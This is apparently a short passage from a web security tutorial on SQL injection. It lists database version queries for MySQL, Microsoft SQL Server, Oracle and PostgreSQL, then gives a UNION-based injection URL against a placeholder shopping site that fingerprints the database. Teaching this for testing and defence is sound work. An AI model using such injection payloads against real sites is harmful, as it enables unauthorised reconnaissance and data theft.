1. Querying the database type and version
The query to get the database type and version depends on the database type.  See the queries below:

Microsoft, MySQL: SELECT @@version
Oracle: SELECT * FROM v$version
PostgreSQL: SELECT version()

So a query to get the database version from an MySQL database could look like this:
https://www.website.com/products?category=Category1'+UNION+SELECT+@@version--
